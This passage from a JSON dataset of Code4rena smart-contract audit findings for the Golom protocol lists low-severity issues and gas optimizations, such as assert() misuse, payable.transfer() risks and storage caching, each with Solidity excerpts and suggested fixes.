      "content": "Unlike some of the other functions, `_mint()` isn't overridden to call `delegate()`, which means the user may forget to do so and will miss out\n\n*There is 1 instance of this issue:*\n```solidity\nFile: /contracts/vote-escrow/VoteEscrowCore.sol\n\n677      function _mint(address _to, uint256 _tokenId) internal returns (bool) {\n678          // Throws if `_to` is zero address\n679          assert(_to != address(0));\n680          // Add NFT. Throws if `_tokenId` is owned by someone\n681          _addTokenTo(_to, _tokenId);\n682          emit Transfer(address(0), _to, _tokenId);\n683          return true;\n684:     }\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L677-L684\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23718",
      "title": "[L-04]  `require()` should be used instead of `assert()`",
      "impact": "LOW",
      "content": "Prior to solidity version 0.8.0, hitting an assert consumes the **remainder of the transaction's available gas** rather than returning it, as `require()`/`revert()` do. `assert()` should be avoided even past solidity version 0.8.0 as its [documentation](https://docs.soliditylang.org/en/v0.8.14/control-structures.html#panic-via-assert-and-error-via-require) states that \"The assert function creates an error of type Panic(uint256). ... Properly functioning code should never create a Panic, not even on invalid external input. If this happens, then there is a bug in your contract which you should fix\".\n\n*There are 13 instances of this issue:*\n```solidity\nFile: contracts/vote-escrow/VoteEscrowCore.sol\n\n493:          assert(idToOwner[_tokenId] == address(0));\n\n506:          assert(idToOwner[_tokenId] == _from);\n\n519:          assert(idToOwner[_tokenId] == _owner);\n\n666:          assert(_operator != msg.sender);\n\n679:          assert(_to != address(0));\n\n861:              assert(IERC20(token).transferFrom(from, address(this), _value));\n\n977:          assert(_isApprovedOrOwner(msg.sender, _tokenId));\n\n981:          assert(_value > 0); // dev: need non-zero value\n\n991:          assert(_isApprovedOrOwner(msg.sender, _tokenId));\n\n1007:         assert(_isApprovedOrOwner(msg.sender, _tokenId));\n\n1023:         assert(IERC20(token).transfer(msg.sender, value));\n\n1110:         assert(_block <= block.number);\n\n1206:         assert(_block <= block.number);\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L493\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23717",
      "title": "[L-03]  Unused/empty `receive()`/`fallback()` function",
      "impact": "LOW",
      "content": "If the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. `require(msg.sender == address(weth))`)\n\n*There are 4 instances of this issue:*\n```solidity\nFile: contracts/core/GolomTrader.sol\n\n459:      fallback() external payable {}\n\n461:      receive() external payable {}\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L459\n\n```solidity\nFile: contracts/rewards/RewardDistributor.sol\n\n313:      fallback() external payable {}\n\n315:      receive() external payable {}\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L313\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23716",
      "title": "[L-02]  Don't use `payable.transfer()`/`payable.send()`",
      "impact": "LOW",
      "content": "The use of `payable.transfer()` is [heavily frowned upon](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/) because it can lead to the locking of funds. The `transfer()` call requires that the recipient is either an EOA account, or is a contract that has a `payable` callback. For the contract case, the `transfer()` call only provides 2300 gas for the contract to complete its operations. This means the following cases can cause the transfer to fail:\n* The contract does not have a `payable` callback\n* The contract's `payable` callback spends more than 2300 gas (which is only enough to emit something)\n* The contract is called through a proxy which itself uses up the 2300 gas\nUse OpenZeppelin's `Address.sendValue()` instead\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/core/GolomTrader.sol\n\n154:              payable(payAddress).transfer(payAmt); // royalty transfer to royaltyaddress\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L154\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23715",
      "title": "[L-1]  Only a billion checkpoints available",
      "impact": "LOW",
      "content": "A user can only have a billion checkpoints which, if the user is a DAO, may cause issues down the line, especially if the last checkpoint involved delegating and can thereafter not be undone\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/contracts/VotingEscrow.sol\n\n535:     mapping(uint => Point[1000000000]) public user_point_history; // user -> Point[user_epoch]\n\n```\nhttps://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L535\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "8797",
      "title": "[G-42] Variable `end` can be of type  `uint128`",
      "impact": "GAS",
      "content": "Variable `end` can be of type  `uint128`  to take less place and save one storage slot.<br>\nA lot of protocols even use `uint64` for dates to reduce gas usage.<br>\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L270-L273\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n270: struct LockedBalance {\n271:     int128 amount;\n272:     uint256 end; //@audit can be uint128 to save storage slot\n273: }\n```\nit can be\n```solidity\n270: struct LockedBalance {\n271:     int128 amount;\n272:     uint128 end;\n273: }\n```\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-42-variable-end-can-be-of-type--uint128",
      "tags": [],
      "finders": []
    },
    {
      "id": "8796",
      "title": "[G-41] Obsolete constants",
      "impact": "GAS",
      "content": "These values can be accessed via kewords, there is no benefit in having these constants:<br>\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L57\n```solidity\nFile:\tcontracts/rewards/RewardDistributor.sol\n57:     uint256 constant secsInDay = 24 * 60 * 60; \n```\nWe can use `1 days` instead of `secsInDay`<br>\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L4\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n295:     uint256 internal constant WEEK = 1 weeks;\n```\nWe can use `1 weeks` instead of `WEEK`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-41-obsolete-constants",
      "tags": [],
      "finders": []
    },
    {
      "id": "8795",
      "title": "[G-40] Same calculation twice",
      "impact": "GAS",
      "content": "`supply_before - value` calculated twice, also it is *checked* arithmetic operation, so cheaper to store result in a stack variable than calculate it twice;<br>\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L1015-L1029\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n1015:         uint256 supply_before = supply;\n1016:         supply = supply_before - value;\n\n1029:         emit Supply(supply_before, supply_before - value);\n```\nWe could store result to stack variable and use it instead:\n```solidity\n1016:         uint256 supply_now = supply = supply_before - value;\n\n1029:         emit Supply(supply_before, supply_now);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-40-same-calculation-twice",
      "tags": [],
      "finders": []
    },
    {
      "id": "8794",
      "title": "[G-39] No need for mapping `supportedInterfaces` to exist",
      "impact": "GAS",
      "content": "This mapping takes some space and every time `supportsInterface(bytes4)` is called we do `SLOAD` to get data from this mapping.<br>\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L368\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n368:     function supportsInterface(bytes4 _interfaceID) external view returns (bool) {\n369:         return supportedInterfaces[_interfaceID];\n370:     }\n```\nI suggest we remove the mapping and  change the function `supportsInterface(bytes4)` to:\n```solidity\n368:     function supportsInterface(bytes4 _interfaceID) external virtual view returns (bool) {\n369:         return _interfaceID == ERC165_INTERFACE_ID ||\n\t\t\t\t\t\t\t\t\t\t\t_interfaceID == ERC721_INTERFACE_ID ||\n\t\t\t\t\t\t\t\t\t\t\t_interfaceID == ERC721_METADATA_INTERFACE_ID\n370:     }\n```\n\nThis way we don't need the mapping `supportedInterfaces` and no `SLOAD`s done;<br>\nIf inherited contracts support other interfaces or don't support these just override this function and add/remove conditions;\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-39-no-need-for-mapping-supportedinterfaces-to-exist",
      "tags": [],
      "finders": []
    },
    {
      "id": "8793",
      "title": "[G-38] Remove duplicate code",
      "impact": "GAS",
      "content": "There is a peace of code that is duplicated in bo blocks of `if` `else`<br>\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#467\n```solidity\n467:    if (current_count == current_index) {\n            // update ownerToNFTokenIdList\n            ownerToNFTokenIdList[_from][current_count] = 0;\n            // update tokenToOwnerIndex\n            tokenToOwnerIndex[_tokenId] = 0;\n        } else {\n            uint256 lastTokenId = ownerToNFTokenIdList[_from][current_count];\n\n            // Add\n            // update ownerToNFTokenIdList\n            ownerToNFTokenIdList[_from][current_index] = lastTokenId;\n            // update tokenToOwnerIndex\n            tokenToOwnerIndex[lastTokenId] = current_index;\n\n            // Delete\n            // update ownerToNFTokenIdList\n            ownerToNFTokenIdList[_from][current_count] = 0;\n            // update tokenToOwnerIndex\n            tokenToOwnerIndex[_tokenId] = 0;\n        }\n```\n\nTo reduce deployment gas should be:\n```solidity\n\tif (current_count != current_index) {\n\t\t\tuint256 lastTokenId = ownerToNFTokenIdList[_from][current_count];\n\n\t\t\t// Add\n\t\t\t// update ownerToNFTokenIdList\n\t\t\townerToNFTokenIdList[_from][current_index] = lastTokenId;\n\t\t\t// update tokenToOwnerIndex\n\t\t\ttokenToOwnerIndex[lastTokenId] = current_index;\n\t} \n\t// update ownerToNFTokenIdList\n\townerToNFTokenIdList[_from][current_count] = 0;\n\t// update tokenToOwnerIndex\n\ttokenToOwnerIndex[_tokenId] = 0;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-38-remove-duplicate-code",
      "tags": [],
      "finders": []
    },
    {
      "id": "8792",
      "title": "[G-37] Wasted gas on copying a struct",
      "impact": "GAS",
      "content": "https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#840\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n840: LockedBalance memory _locked = locked_balance;\n\n1164:     function _supply_at(Point memory point, uint256 t) internal view returns (uint256) {\n1165:         Point memory last_point = point;\n```\n`locked_balance` is of same type and never used after this. Same thing with `point`;<br>\nThere is no need in copy of it, but gas for making a copy is spent;\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-37-wasted-gas-on-copying-a-struct",
      "tags": [],
      "finders": []
    },
    {
      "id": "8791",
      "title": "[G-36] `last_point` value rewritten right after initialization",
      "impact": "GAS",
      "content": "If `_epoch > 0`, then `last_point` is rewritten, and initialization on L726 becomes waste of gas;<br>\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#726\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n726:        Point memory last_point = Point({bias: 0, slope: 0, ts: block.timestamp, blk: block.number});\n727:        if (_epoch > 0) {\n728:            last_point = point_history[_epoch];\n729:        }\n```\n### Mitigation\n```solidity\nPoint memory last_point = _epoch > 0 ? last_point = point_history[_epoch] \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t: Point({bias: 0, slope: 0, ts: block.timestamp, blk: block.number});\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-36-last_point-value-rewritten-right-after-initialization",
      "tags": [],
      "finders": []
    },
    {
      "id": "8790",
      "title": "[G-35] No need to read `tokenId` second time",
      "impact": "GAS",
      "content": "https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L948\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n948:        ++tokenId;\n949:        uint256 _tokenId = tokenId;\n```\n### Mitigation\nChange it to `uint256 _tokenId = ++tokenId;` and `92 gas is saved this way`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-35-no-need-to-read-tokenid-second-time",
      "tags": [],
      "finders": []
    },
    {
      "id": "8789",
      "title": "[G-34] No need to evaluate all expressions to know if one of them is true",
      "impact": "GAS",
      "content": "When we have a code `expressionA || expressionB` if `expressionA` is true then `expressionB` will not be evaluated and gas saved;<br>\n*Instances include:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L650\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n650: bool senderIsOwner = (idToOwner[_tokenId] == msg.sender);\n651: bool senderIsApprovedForAll = (ownerToOperators[owner])[msg.sender];\n652: require(senderIsOwner || senderIsApprovedForAll);\n```\nVariables `bool senderIsOwner` and `bool senderIsApprovedForAll`  just add more work, \nit  should  be:\n```solidity\n require((idToOwner[_tokenId] == msg.sender) || (ownerToOperators[owner])[msg.sender];\n```\nso if `(idToOwner[_tokenId] == msg.sender)` is `true` we will not do SLOAD to get `(ownerToOperators[owner])[msg.sender]`;\nsaving runtime and deployment gas;\n\nsame thing here:\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L439\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n439:        bool spenderIsOwner = owner == _spender;\n440:        bool spenderIsApproved = _spender == idToApprovals[_tokenId];\n441:        bool spenderIsApprovedForAll = (ownerToOperators[owner])[_spender];\n442:        return spenderIsOwner || spenderIsApproved || spenderIsApprovedForAll;\n```\nBut this one is a `view` function, so only deployment gas saved.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-34-no-need-to-evaluate-all-expressions-to-know-if-one-of-them-is-true",
      "tags": [],
      "finders": []
    },
    {
      "id": "8788",
      "title": "[G-33] Remove unreachable code",
      "impact": "GAS",
      "content": "There is a peace of code that does not need to exist:<br>\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L177\n```solidity\nFile:\tcontracts/core/GolomTrader.sol \n177:        require(signaturesigner == o.signer, 'invalid signature');\n178:        if (signaturesigner != o.signer) {\n179:            return (0, hashStruct, 0); //@audit unreachable code\n180:        }\n```\nCheck inside `if` is pointless, because `signaturesigner != o.signer` can not be `true`, when if it is, then transaction is already reverted because of line 177.<br>\n`hardhat-gas-reporter` shows deployment gas difference from `2013842` to `2001108`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-33-remove-unreachable-code",
      "tags": [],
      "finders": []
    },
    {
      "id": "8787",
      "title": "[G-32] Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table.<br>\n*Instances include:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L317\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n317:     string public constant name = 'veNFT';\n318:    string public constant symbol = 'veNFT';\n319:    string public constant version = '1.0.0';\n320:    uint8 public constant decimals = 18;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-32-using-private-rather-than-public-for-constants-saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "8786",
      "title": "[G-31] State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "Caching will replace each Gwarmaccess (100 gas) with a much cheaper stack read.<br>\nLess obvious fixes/optimizations include having local storage variables of mappings within state variable mappings or mappings within state variable structs, having local storage variables of structs within mappings, having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.<br>\n*Instances include:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L98-L138\n`rewardToken` accessed 7 times;\n`epoch` accessed 15 times;\n`ve` accessed 2 times;\n`epochTotalFee[epoch]` accessed 2 times;\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L144\n`epoch` accessed  N times, each loop iteration, where N = epochs.length\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L158\n`epoch` accessed  N times, each loop iteration, where N = epochs.length\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L172-L210\n`ve` accessed 8 times\n`epochBeginTime[epochs[index]]` accessed 4 times\n`epoch` accessed  N times, each loop iteration, where N = epochs.length\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L242-L269\n`distributor` accessed two times; \n\n### Small PoC\ncopy `distributor` to stack variable:<br>\n`Distributor _distributor = distributor` ;<br>\nuse `_distributor` instead of `distributor`;<br>\n`hardhat-gas-reporter` results<br>\nbefore fix:\n| Methods ||||||\n|-|:-|:-:|-|:-|:-:|\n| Contract | Method | min | max | avg | #calls |\n| GolomTrader | fillAsk | 238153 |241948|241401| 7 |\nafter fix:\n| Methods ||||||\n|-|:-|:-:|-|:-|:-:|\n| Contract | Method | min | max | avg | #calls |\n| GolomTrader | fillAsk | 238052 |241847|241300| 7 |\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L382-L383<br>\n`WETH` accessed two times;\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L384-L402<br>\n`distributor` accessed two times; \n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowDelegation.sol#L138-L139<br>\n`checkpoints[nftId][nCheckpoints - 1]` accessed two times;\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowDelegation.sol#L213-L214<br>\n`checkpoint.delegatedTokenIds` accessed two times;\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L644-L650<br>\n`idToOwner[_tokenId]` accessed two times;\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L948-L949<br>\n`tokenId` accessed two times;\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-31-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage",
      "tags": [],
      "finders": []
    },
    {
      "id": "8785",
      "title": "[G-30] State variables with values known at compile time should be constants",
      "impact": "GAS",
      "content": "Variables with values known at compile time and that do not change at runtime should be declared as `constant`.<br>\n*There is 2 instance of this issue:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L46\n```solidity\nFile:\tcontracts/rewards/RewardDistributor.sol\n46: uint256 public startTime; // timestamp at which the contracts need to be activated\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L45\n```solidity\nFile:\tcontracts/core/GolomTrader.sol \n45: ERC20 WETH = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-30-state-variables-with-values-known-at-compile-time-should-be-constants",
      "tags": [],
      "finders": []
    },
    {
      "id": "8784",
      "title": "[G-29] State variables only set in the constructor should be declared `immutable`",
      "impact": "GAS",
      "content": "Avoids a Gsset (20000 gas) in the constructor, and replaces each Gwarmacces (100 gas) with a `PUSH32` (3 gas). If getters are still desired, '\\_' can be added to the variable name and the getter can be added manually.\n\n*There is 3 instance of this issue:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L143\n```solidity\nFile:\tcontracts/rewards/RewardDistributor.sol\n68: ERC20 public rewardToken;\n69: ERC20 public weth;\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L300\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n300: address public token;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-29-state-variables-only-set-in-the-constructor-should-be-declared-immutable",
      "tags": [],
      "finders": []
    },
    {
      "id": "8783",
      "title": "[G-28] Remove or replace unused variables",
      "impact": "GAS",
      "content": "Remove or replace unused variables to save deployment gas.<br>\n*Instances include:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L4\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n319:    string public constant version = '1.0.0';\n320:    uint8 public constant decimals = 18;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-28-remove-or-replace-unused-variables",
      "tags": [],
      "finders": []
    },
    {
      "id": "8782",
      "title": "[G-27] `require()`/`revert()` strings longer than 32 bytes cost extra gas",
      "impact": "GAS",
      "content": "Each extra chunk of byetes past the original 32 i[incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs 3 gas.<br>\n*There are 8 instances of this issue:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/governance/GolomToken.sol#L24\n```solidity\nFile:\tcontracts/governance/GolomToken.sol\n24: require(msg.sender == minter, 'GolomToken: only reward distributor can enable');\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L181\n```solidity\nFile:\tcontracts/rewards/RewardDistributor.sol\n181:  require(tokenowner == ve.ownerOf(tokenids[tindex]), 'Can only claim for a single Address together');\n\n292: require(traderEnableDate <= block.timestamp, 'RewardDistributor: time not over yet');\n\n309: require(voteEscrowEnableDate <= block.timestamp, 'RewardDistributor: time not over yet');\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowDelegation.sol#L73\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowDelegation.sol\n73: require(this.balanceOfNFT(tokenId) >= MIN_VOTING_POWER_REQUIRED, 'VEDelegation: Need more voting power');\n\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L929\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n929: require(_locked.end > block.timestamp, 'Cannot add to expired lock. Withdraw');\n\n945: require(unlock_time > block.timestamp, 'Can only lock until time in the future');\n\n983: require(_locked.end > block.timestamp, 'Cannot add to expired lock. Withdraw');\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-27-requirerevert-strings-longer-than-32-bytes-cost-extra-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "8781",
      "title": "[G-26] Copying struct to memory can be more expensive than just reading from storage",
      "impact": "GAS",
      "content": "I suggest using the `storage` keyword instead of the `memory` one, as the copy in memory is wasting some MSTOREs and MLOADs.<br>\n*Instances include:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L925\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n1083: LockedBalance memory _locked = locked[_tokenId];\n\n1136: Point memory point_1 = point_history[_epoch + 1];\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowDelegation.sol#L101\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowDelegation.sol\n101: Checkpoint memory oldCheckpoint = checkpoints[toTokenId][nCheckpoints - 1];\n```\n\nShould use `storage`, because each struct field is read only once.\n \n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-26-copying-struct-to-memory-can-be-more-expensive-than-just-reading-from-storage",
      "tags": [],
      "finders": []
    },
    {
      "id": "8780",
      "title": "[G-25] `<array>.length` should not be looked up in every loop of a for-loop",
      "impact": "GAS",
